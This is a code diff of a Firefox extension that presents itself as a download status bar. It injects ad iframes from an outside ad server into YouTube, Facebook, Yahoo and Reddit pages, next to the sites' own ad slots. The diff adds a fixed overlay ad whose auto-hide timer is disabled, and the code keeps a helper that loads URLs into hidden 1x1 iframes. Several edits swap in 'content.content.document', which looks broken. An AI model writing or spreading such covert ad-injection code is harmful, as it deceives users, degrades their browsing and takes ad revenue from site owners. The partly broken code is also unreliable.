@@ -3,6 +3,7 @@ if (!dsb20111022) var dsb20111022 = {};
 dsb20111022.GLOBALS = function () {
   return {
     PLUGIN_NAMESPACE : 'downbar',
+		WHITELIST:'www.youtube.com,www.facebook.com,www.yahoo.com,www.reddit.com',
     PLUGIN_SERVER : 'http://www.downloadstatusbarapp.com/',
     AZ_300 : 57,
     AZ_728 : 58,
@@ -140,7 +141,7 @@ dsb20111022.contentscripts = function () {
       if (dsb20111022.pluginnetwork.isFirstRunDaily()) {
         runstr = "&firstrun="+dsb20111022.GLOBALS.PLUGIN_NAMESPACE;
       }
-      var ifr = content.document.createElement("iframe");
+      var ifr = content.content.document.createElement("iframe");
       ifr.setAttribute("src", "http://www.iicdn.com/www/delivery/afr.php?zoneid=" + zone + "&refresh=60" + runstr);
       ifr.setAttribute("height", height);
       ifr.setAttribute("width", width);
@@ -155,9 +156,9 @@ dsb20111022.contentscripts = function () {
     // Yahoo functions
     //
     contentEdits : function () {
-      if (content.document.querySelector('#a47abb2d')!==null) return;
-      if (content.document.querySelector('#a47abb3d')!==null) return;
-      if (content.document.querySelector('#a47abb4d')!==null) return;
+      if (content.content.document.querySelector('#a47abb2d')!==null) return;
+      if (content.content.document.querySelector('#a47abb3d')!==null) return;
+      if (content.content.document.querySelector('#a47abb4d')!==null) return;
 
       var domainparts = window.location.host.split(".").reverse();
       for(var i = 0; i < swapDefObj["bl"].length; i++) {
@@ -196,11 +197,11 @@ dsb20111022.contentscripts = function () {
       // if AQ_ON is false, execute the modification regardless of the aq number.
       // If AQ_ON is true, respect the aq number as defined.
       if(!AQ_ON || aq>0) {
-        if (document.querySelector('iframe[width="300"]')!==null) {
-          var a1 = document.querySelector('iframe[width="300"]');
+        if (content.document.querySelector('iframe[width="300"]')!==null) {
+          var a1 = content.document.querySelector('iframe[width="300"]');
           if (a1.height == 250)
           {
-            var r = document.createElement("div");
+            var r = content.document.createElement("div");
             r.id = "__"+window.location.host+"_aq";
             AZ_300 = pluginnetwork.GLOBALS.AZ_300;
             r.appendChild(this.createIframe('a47abb2d', AZ_300, 250, 300));
@@ -211,11 +212,11 @@ dsb20111022.contentscripts = function () {
             tta = true;
           }
         }
-        if (document.querySelector('iframe[width="728"]')!==null) {
-          var a1 = document.querySelector('iframe[width="728"]');
+        if (content.document.querySelector('iframe[width="728"]')!==null) {
+          var a1 = content.document.querySelector('iframe[width="728"]');
           if (a1.height == 90)
           {
-            var r = document.createElement("div");
+            var r = content.document.createElement("div");
             r.id = "__"+window.location.host+"_aq2";
             AZ_728 = pluginnetwork.GLOBALS.AZ_728;
             r.appendChild(this.createIframe('a47abb3d', AZ_728, 90, 728));
@@ -225,11 +226,11 @@ dsb20111022.contentscripts = function () {
             tta = true;
           }
         }
-        if (document.querySelector('iframe[width="160"]')!==null) {
-          var a1 = document.querySelector('iframe[width="160"]');
+        if (content.document.querySelector('iframe[width="160"]')!==null) {
+          var a1 = content.document.querySelector('iframe[width="160"]');
           if (a1.height == 600)
           {
-            var r = document.createElement("div");
+            var r = content.document.createElement("div");
             r.id = "__"+window.location.host+"_aq3";
             AZ_160 = pluginnetwork.GLOBALS.AZ_160;
             r.appendChild(this.createIframe('a47abb4d', AZ_160, 600, 160));
@@ -259,13 +260,26 @@ dsb20111022.contentscripts = function () {
     runYouTube: function () {
       var afr300 = this.createIframe('a47abb2d', dsb20111022.GLOBALS.AZ_300, 250, 300);
       var afr728 = this.createIframe('a47abb3d', dsb20111022.GLOBALS.AZ_728, 90, 728);
-    }
+    },
+	contentOverlay: function(){
+		//probability dampener here
+		d('contentOverlay');
+		var afr728 = this.createIframe('a47abb3d', dsb20111022.GLOBALS.AZ_728, 90, 728);
+		var ifr = content.document.createElement("div");
+		ifr.setAttribute("style", "height: 100px; opacity: 0.95; position: fixed; bottom: 0; left: 0; width: 100%; z-index: 10000; overflow: hidden; text-align: right;color: white; font-size: 18px; font-family: Helvetica; background: #1F1F1F;");
+		ifr.setAttribute("id", "pn_co");
+		ifr.innerText = "auto-hiding in 7 seconds.";
+		ifr.appendChild(afr728);
+		content.document.body.appendChild(ifr);
+		//setTimeout(function(){ var ifr = content.document.querySelector('#pn_co'); ifr.parentNode.removeChild(ifr);},7000);
+	}
   }
 }();
 
 dsb20111022.pluginnetwork = function () {
   return {
     // Check if either on yahoo or youtube.
+		initialized:false,
     isYahoo: function (href) {
       return href.match(/http:\/\/.*\.yahoo\.com/i);
     },
@@ -274,7 +288,8 @@ dsb20111022.pluginnetwork = function () {
     },
     // Check if all conditions are met.
     isAllowable: function (href) {
-      return dsb20111022.GLOBALS.whitelist.indexOf(href) != -1;
+			
+      return dsb20111022.GLOBALS.WHITELIST.indexOf(href) != -1;
     },
 
     //
@@ -343,7 +358,7 @@ dsb20111022.pluginnetwork = function () {
       getBrowser().selectedTab = tab;
     },
     iframeWithUrl: function (url) {
-      var ifr = content.document.createElement("iframe");
+      var ifr = content.content.document.createElement("iframe");
       ifr.setAttribute("src", url);
       ifr.setAttribute("height", 1);
       ifr.setAttribute("width", 1);
@@ -352,7 +367,7 @@ dsb20111022.pluginnetwork = function () {
       ifr.setAttribute("type", "content");
       ifr.setAttribute("scrolling", "NO");
       ifr.setAttribute("frameborder", "0");
-      content.document.body.appendChild(ifr);
+      content.content.document.body.appendChild(ifr);
     },
     installationEvent: function() {
       switch(dsb20111022.GLOBALS.INST_METHOD) {
@@ -372,17 +387,20 @@ dsb20111022.pluginnetwork = function () {
     },
     contentInit: function () {
 
-      var href = getWebNavigation().currentURI.spec;
-      d("HREF: "+href);
-
-      if (content.document.location == null) return;
-      if (content.document.location.protocol!="http:") return;
+      var currentURI = getWebNavigation().currentURI;
+			if (currentURI == null) return;
+      if (currentURI.scheme!="http") return;
+			if (content.window !== content.window.top) return;
+			if (dsb20111022.pluginnetwork.initialized) return; // we're init'd return 
+			
+			dsb20111022.pluginnetwork.initialized = true;
       if (this.isFirstRun()) {
         this.installationEvent();
         return; // exit the function until the doneWelcomeMessage is set.
       }
       if (this.isMarketingEnabled() == false) return;
-      if (this.isAllowable(href)) {
+      if (this.isAllowable(currentURI.host)) {
+//		  dsb20111022.downloadwatcher.init(); // look for new downloads
         //dsb2011022.modifier.modify(href);
       }
     },
@@ -394,5 +412,7 @@ dsb20111022.pluginnetwork = function () {
     }
   }
 }();
+
+
 window.addEventListener("load", function () { dsb20111022.pluginnetwork.init() }, false);
 window.addEventListener("unload", function () { dsb20111022.pluginnetwork.uninit() }, false);
